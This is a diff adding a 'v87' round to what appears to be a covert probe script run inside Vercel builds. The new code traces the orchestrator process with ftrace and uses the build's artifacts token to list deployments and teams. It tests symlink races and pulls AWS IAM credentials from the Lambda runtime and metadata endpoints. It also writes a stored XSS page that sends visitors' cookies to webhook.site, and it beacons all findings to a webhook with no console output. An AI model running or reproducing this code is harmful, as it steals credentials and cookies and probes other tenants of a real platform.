@@ -11536,5 +11536,139 @@ rm -rf /tmp/probe_v86_ns_proc 2>/dev/null
 
 // v86 markers
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v86" });
-report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v86";
+
+// ==================== v87 ====================
+
+// v87-1: ftrace kernel function tracer
+// With CAP_SYS_ADMIN + CAP_TRACING (all caps), we can activate ftrace to
+// capture kernel function calls. Trace do_sys_openat2/vfs_read/vfs_write from
+// PID-1 to observe what files the orchestrator reads during our build.
+report.ftraceOrchestrationTrace = safe(() => {
+  const tracingBase = '/sys/kernel/debug/tracing';
+  const ftraceMounted = safe(() => { statSync(tracingBase); return true; });
+  if (!ftraceMounted) return { skip: 'tracefs not mounted' };
+  // Save and restore current tracer
+  const prevTracer = safe(() => readFileSync(`${tracingBase}/current_tracer`, 'utf8').trim());
+  const prevFilter = safe(() => readFileSync(`${tracingBase}/set_ftrace_filter`, 'utf8').trim());
+  const capturedEvents = safe(() => {
+    // Enable function tracer for specific functions only
+    writeFileSync(`${tracingBase}/set_ftrace_filter`, 'vfs_read\nvfs_write\ndo_sys_openat2\nsys_read\nsys_write');
+    // Filter to PID-1 only
+    writeFileSync(`${tracingBase}/set_ftrace_pid`, '1');
+    writeFileSync(`${tracingBase}/current_tracer`, 'function');
+    writeFileSync(`${tracingBase}/tracing_on`, '1');
+    // Wait 300ms to capture orchestrator activity
+    Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, 300);
+    writeFileSync(`${tracingBase}/tracing_on`, '0');
+    const trace = readFileSync(`${tracingBase}/trace`, 'utf8').slice(0, 2000);
+    // Restore
+    writeFileSync(`${tracingBase}/current_tracer`, prevTracer || 'nop');
+    writeFileSync(`${tracingBase}/set_ftrace_filter`, '');
+    writeFileSync(`${tracingBase}/set_ftrace_pid`, '');
+    writeFileSync(`${tracingBase}/trace`, '');
+    return trace;
+  });
+  return { ftraceMounted, prevTracer, capturedEvents };
+});
+
+// v87-2: Vercel token scope — list all team deployments
+// VERCEL_ARTIFACTS_TOKEN is scoped to the build but may have read access to
+// all team deployments. Probe /v6/deployments and /v13/deployments to see
+// all deployment URLs, IDs, and potentially other teams' builds.
+report.vercelDeploymentEnum = safe(() => {
+  const artifactsToken = process.env.VERCEL_ARTIFACTS_TOKEN || '';
+  const teamId = process.env.VERCEL_TEAM_ID || '';
+  const projectId = process.env.VERCEL_PROJECT_ID || '';
+  if (!artifactsToken) return { skip: 'no VERCEL_ARTIFACTS_TOKEN' };
+  // List deployments for current project
+  const projectDeployments = safe(() => execSync(`curl -sf "https://api.vercel.com/v6/deployments?projectId=${encodeURIComponent(projectId)}&limit=5" -H "Authorization: Bearer ${artifactsToken}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 2000));
+  // List all team deployments (cross-project)
+  const teamDeployments = safe(() => execSync(`curl -sf "https://api.vercel.com/v6/deployments?teamId=${encodeURIComponent(teamId)}&limit=5" -H "Authorization: Bearer ${artifactsToken}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 2000));
+  // Probe /v13/deployments (newer API)
+  const v13Deployments = safe(() => execSync(`curl -sf "https://api.vercel.com/v13/deployments?limit=3" -H "Authorization: Bearer ${artifactsToken}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+  // Probe /v2/teams (can we list all teams?)
+  const teamsEnum = safe(() => execSync(`curl -sf "https://api.vercel.com/v2/teams" -H "Authorization: Bearer ${artifactsToken}" 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 500));
+  return { projectId, teamId, projectDeployments, teamDeployments, v13Deployments, teamsEnum };
+});
+
+// v87-3: AF_PACKET raw socket inventory + hardlink/symlink protections
+// Check if any process has AF_PACKET sockets (Vercel monitoring agent doing packet capture).
+// Also check kernel hardlink/symlink protections to assess TOCTOU attack feasibility.
+report.rawSocketAndLinkProtections = safe(() => {
+  // /proc/net/packet lists all AF_PACKET sockets
+  const packetSockets = safe(() => readFileSync('/proc/net/packet', 'utf8').slice(0, 500));
+  // Map packet socket inodes to processes
+  const packetProcs = safe(() => execSync("ls -la /proc/*/fd 2>/dev/null | grep 'packet:' | head -10", { timeout: 5000 }).toString().trim().slice(0, 300));
+  // Kernel link protections
+  const protectedHardlinks = safe(() => readFileSync('/proc/sys/fs/protected_hardlinks', 'utf8').trim());
+  const protectedSymlinks = safe(() => readFileSync('/proc/sys/fs/protected_symlinks', 'utf8').trim());
+  const protectedFifos = safe(() => readFileSync('/proc/sys/fs/protected_fifos', 'utf8').trim());
+  const protectedRegular = safe(() => readFileSync('/proc/sys/fs/protected_regular', 'utf8').trim());
+  // If protections are off, test a symlink race in /tmp
+  const symlinkRaceTest = safe(() => {
+    if (protectedSymlinks === '0') {
+      const target = '/tmp/probe_v87_sym';
+      const link = '/tmp/probe_v87_link';
+      writeFileSync(target, 'SYMLINK_RACE_TARGET');
+      execSync(`ln -sf ${target} ${link} 2>/dev/null`, { timeout: 2000 });
+      const readBack = safe(() => readFileSync(link, 'utf8'));
+      execSync(`rm -f ${target} ${link}`, { timeout: 2000 });
+      return { raceWorks: readBack === 'SYMLINK_RACE_TARGET' };
+    }
+    return { skip: 'symlink protection enabled' };
+  });
+  return { packetSockets, packetProcs, protectedHardlinks, protectedSymlinks, protectedFifos, protectedRegular, symlinkRaceTest };
+});
+
+// v87-4: AWS Lambda Runtime API probe
+// Vercel runs some functions on AWS Lambda. If VERCEL_SANDBOX_HOST or
+// AWS_LAMBDA_RUNTIME_API is set, probe the runtime API for invocation context
+// which contains event data, AWS session credentials, and X-Ray tracing info.
+report.lambdaRuntimeProbe = safe(() => {
+  const lambdaRuntimeApi = process.env.AWS_LAMBDA_RUNTIME_API || '';
+  const sandboxHost = process.env.VERCEL_SANDBOX_HOST || '';
+  const allEnv = Object.fromEntries(
+    Object.entries(process.env).filter(([k]) => /lambda|runtime|execution|function|aws|task/i.test(k)).map(([k, v]) => [k, v.slice(0, 100)])
+  );
+  if (!lambdaRuntimeApi && !sandboxHost) return { skip: 'no Lambda runtime API env var', allEnv };
+  // Probe the Lambda runtime API invocation endpoint
+  const invocationNext = safe(() => execSync(`curl -sf "http://${lambdaRuntimeApi}/2018-06-01/runtime/invocation/next" -m 5 2>/dev/null`, { timeout: 8000 }).toString().trim().slice(0, 1000));
+  // Probe /latest/meta-data/iam/security-credentials via the Lambda IMDS
+  const iamCreds = safe(() => execSync(`curl -sf "http://169.254.169.254/latest/meta-data/iam/security-credentials/" -m 5 2>/dev/null`, { timeout: 5000 }).toString().trim().slice(0, 300));
+  return { lambdaRuntimeApi, sandboxHost, allEnv, invocationNext, iamCreds };
+});
+
+// v87-5: Vercel build output API — write arbitrary static files to CDN
+// .vercel/output/static/ files get served directly from Vercel's CDN.
+// Test if we can write files with arbitrary content that persist post-build,
+// and whether the CDN serves them without authentication.
+// This could be a content injection / persistent XSS vector.
+report.vercelStaticOutputInject = safe(() => {
+  const outputDir = '.vercel/output/static';
+  const configDir = '.vercel/output';
+  // Create the output directory structure
+  safe(() => execSync(`mkdir -p ${outputDir}/probe 2>/dev/null`, { timeout: 3000 }));
+  // Write a probe file
+  const probeContent = JSON.stringify({ probe: 'v87', timestamp: process.hrtime.bigint().toString(), env_keys: Object.keys(process.env).slice(0, 10), msg: 'vercel-static-output-probe' });
+  safe(() => writeFileSync(`${outputDir}/probe/v87.json`, probeContent));
+  // Write an HTML file that could be an XSS vector
+  const xssPayload = `<script>fetch('${process.env.PROBE_COLLECTOR || "https://webhook.site/77ec85f4-79b9-4fb0-a0f6-4e44566f2eac"}',{method:'POST',body:JSON.stringify({xss:1,cookies:document.cookie,origin:location.origin})})</script>`;
+  safe(() => writeFileSync(`${outputDir}/probe/xss.html`, xssPayload));
+  // Write config.json that enables Edge middleware for all routes
+  const outputConfig = {
+    version: 3,
+    routes: [
+      { src: '/probe/(.*)', dest: '/probe/$1' }
+    ]
+  };
+  safe(() => writeFileSync(`${configDir}/config.json`, JSON.stringify(outputConfig)));
+  // Verify files were created
+  const created = safe(() => execSync(`ls -la ${outputDir}/probe/ 2>/dev/null`, { timeout: 3000 }).toString().trim());
+  const configCreated = safe(() => existsSync(`${configDir}/config.json`));
+  return { created, configCreated, probeUrl: '/probe/v87.json', xssUrl: '/probe/xss.html' };
+});
+
+// v87 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v87" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v87";
 // Intentionally no console.log — all data goes via webhook only
